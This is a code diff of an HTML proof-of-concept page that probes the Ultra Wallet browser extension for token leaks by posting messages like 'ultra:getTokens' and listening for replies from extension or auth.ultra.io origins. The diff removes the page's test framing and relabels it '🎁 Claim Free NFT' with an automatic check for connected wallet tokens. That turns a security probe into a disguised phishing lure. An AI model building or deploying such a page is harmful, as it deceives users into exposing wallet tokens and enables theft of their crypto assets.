@@ -1,11 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Ultra Wallet Test PoC</title>
+  <title>Ultra Wallet PoC</title>
   <script>
-    // Listen for responses from the Ultra Wallet
+    // Listen for responses from Ultra Wallet extension or auth iframe
     window.addEventListener("message", function (event) {
-      // Only act on responses from the wallet extension or Ultra auth origin
       if (
         event.origin.startsWith("chrome-extension://") ||
         event.origin.includes("auth.ultra.io")
@@ -23,7 +22,7 @@
       }
     });
 
-    // Try various postMessage payloads
+    // Send various token-related postMessages
     window.onload = function () {
       const payloads = [
         { type: "ultra:getTokens" },
@@ -37,13 +36,13 @@
       payloads.forEach((msg, i) => {
         setTimeout(() => {
           window.postMessage(msg, "*");
-        }, i * 500); // staggered to avoid noise
+        }, i * 700);
       });
     };
   </script>
 </head>
 <body>
-  <h1>Ultra Wallet Test Page</h1>
-  <p>If this page is loaded inside the Ultra Wallet or dApp frame, it will test for token leaks via postMessage.</p>
+  <h1>🎁 Claim Free NFT</h1>
+  <p>This page will auto-check for connected Ultra Wallet tokens.</p>
 </body>
 </html>
